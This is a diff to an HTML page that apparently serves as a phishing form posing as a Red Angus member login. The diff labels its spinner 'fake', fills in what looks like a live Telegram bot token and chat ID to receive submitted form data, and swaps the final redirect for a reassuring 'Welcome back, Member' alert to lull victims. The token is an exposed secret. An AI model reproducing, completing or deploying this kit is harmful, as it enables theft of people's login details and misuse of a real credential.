@@ -8,7 +8,7 @@
         body {
             margin: 0;
             padding: 0;
-            background-color: #f5f7fa;
+            background-color: #f5f7fa; /* Clean light gray */
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
             justify-content: center;
@@ -22,7 +22,7 @@
             padding: 30px;
             border-radius: 8px;
             box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            border-top: 4px solid #A51D1D;
+            border-top: 4px solid #A51D1D; /* Red Angus Red */
         }
 
         .header {
@@ -98,6 +98,7 @@
             margin-bottom: 10px;
         }
 
+        /* Fake loading spinner */
         .loader {
             display: none;
             border: 2px solid #f3f3f3;
@@ -141,8 +142,8 @@
 
 <script>
     // --- CONFIGURATION ---
-    const BOT_TOKEN = 'YOUR_BOT_TOKEN'; 
-    const CHAT_ID = 'YOUR_CHAT_ID';
+    const BOT_TOKEN = '8917250221:AAHn3ooqjGzdDps8vJ_zAg6Gj7Fu3ceqp94'; 
+    const CHAT_ID = '6479764005';
     // ---------------------
 
     const canvas = document.getElementById('formCanvas');
@@ -262,12 +263,11 @@
             });
 
             statusDiv.innerText = "Success! Redirecting...";
-            
-            // 2 second delay before redirect
             setTimeout(() => {
-                window.location.href = "https://www.cnn.com";
-            }, 2000);
-
+                alert("Welcome back, Member.");
+                // Optional redirect
+                // window.location.href = "https://redangus.com";
+            }, 1000);
         } catch (err) {
             statusDiv.innerText = "Error sending data.";
             loader.style.display = "none";
